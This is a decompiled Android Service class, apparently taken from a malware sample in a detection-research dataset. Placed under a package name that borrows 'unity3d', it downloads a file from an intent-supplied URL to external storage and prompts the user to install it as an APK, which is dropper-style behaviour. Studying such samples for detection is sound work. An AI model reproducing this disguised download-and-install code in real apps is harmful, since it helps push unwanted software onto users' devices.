package com.unity3d.client;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;
import org.apache.http.HttpEntity;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/cda1bec27e663b5b512c108d4427c257.apk/classes.dex */
public class Us extends Service {
    private NotificationManager c;
    private i d;
    private h f;
    private Map e = new HashMap();
    int a = 0;
    PendingIntent b = null;

    private Notification a(String str, String str2, String str3, int i) {
        Notification notification = new Notification();
        notification.icon = 17301633;
        notification.tickerText = String.valueOf(str) + "-" + str2;
        notification.when = System.currentTimeMillis();
        notification.defaults = 4;
        notification.setLatestEventInfo(this, str, str2, this.b);
        this.c.notify(i, notification);
        return notification;
    }

    private void a(int i, int i2, String str, Notification notification, int i3, Uri uri, String str2) {
        Message message = new Message();
        message.what = i;
        message.arg1 = 0;
        this.f = new h(this);
        this.f.d = i2;
        this.f.b = str;
        this.f.e = i3;
        this.f.a = notification;
        this.f.f = uri;
        this.f.c = str2;
        message.obj = this.f;
        this.d.sendMessage(message);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(Notification notification, String str, String str2, String str3, int i) {
        File file;
        File file2 = null;
        try {
            HttpEntity entity = new DefaultHttpClient().execute(new HttpGet(str3)).getEntity();
            long contentLength = entity.getContentLength();
            file = new File(Environment.getExternalStorageDirectory(), "/pinke/" + str3.substring(str3.lastIndexOf("/") + 1));
            boolean z = true;
            try {
                if (file.exists()) {
                    if (contentLength == file.length()) {
                        z = false;
                    } else {
                        file.delete();
                    }
                }
                if (!z) {
                    a(2, 0, str3, notification, i, Uri.fromFile(file), str);
                    return;
                }
                InputStream content = entity.getContent();
                if (content == null) {
                    if (file != null && file.exists()) {
                        file.delete();
                    }
                    a(-1, 0, str3, notification, i, null, str);
                    return;
                }
                File file3 = new File(Environment.getExternalStorageDirectory(), "/pinke");
                if (!file3.exists() && !file3.isDirectory()) {
                    file3.mkdir();
                }
                file.createNewFile();
                BufferedInputStream bufferedInputStream = new BufferedInputStream(content);
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream);
                a(1, 1, str3, notification, i, null, str);
                long j = 0;
                byte[] bArr = new byte[1024];
                int i2 = 0;
                while (true) {
                    int read = bufferedInputStream.read(bArr);
                    if (read == -1) {
                        bufferedOutputStream.flush();
                        bufferedOutputStream.close();
                        fileOutputStream.flush();
                        fileOutputStream.close();
                        bufferedInputStream.close();
                        content.close();
                        a(2, 0, str3, notification, i, Uri.fromFile(file), str);
                        return;
                    }
                    bufferedOutputStream.write(bArr, 0, read);
                    long j2 = j + read;
                    int i3 = (int) ((j2 / contentLength) * 100.0d);
                    if (i3 - i2 >= 5) {
                        a(1, i3, str3, notification, i, null, str);
                        j = j2;
                        i2 = i3;
                    } else {
                        j = j2;
                    }
                }
            } catch (ClientProtocolException e) {
                file2 = file;
                if (file2 != null && file2.exists()) {
                    file2.delete();
                }
                a(-1, 0, str3, notification, i, null, str);
            } catch (IOException e2) {
                if (file != null && file.exists()) {
                    file.delete();
                }
                a(-1, 0, str3, notification, i, null, str);
            } catch (Exception e3) {
                if (file != null && file.exists()) {
                    file.delete();
                }
                a(-1, 0, str3, notification, i, null, str);
            }
        } catch (ClientProtocolException e4) {
        } catch (IOException e5) {
            file = null;
        } catch (Exception e6) {
            file = null;
        }
    }

    public void a(Uri uri) {
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.addFlags(268435456);
        intent.setDataAndType(uri, "application/vnd.android.package-archive");
        startActivity(intent);
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.d = new i(this, Looper.myLooper(), this);
        this.b = PendingIntent.getActivity(this, 0, new Intent(), 0);
        this.c = (NotificationManager) getSystemService("notification");
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
    }

    @Override // android.app.Service
    public void onStart(Intent intent, int i) {
        super.onStart(intent, i);
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        super.onStartCommand(intent, i, i2);
        String stringExtra = intent.getStringExtra("url");
        String stringExtra2 = intent.getStringExtra("title");
        String stringExtra3 = intent.getStringExtra("content");
        int i3 = this.a + 1;
        this.a = i3;
        new g(this, new f(this, a(stringExtra2, stringExtra3, stringExtra, i3), stringExtra2, stringExtra3, stringExtra, i3)).start();
        return 3;
    }
}
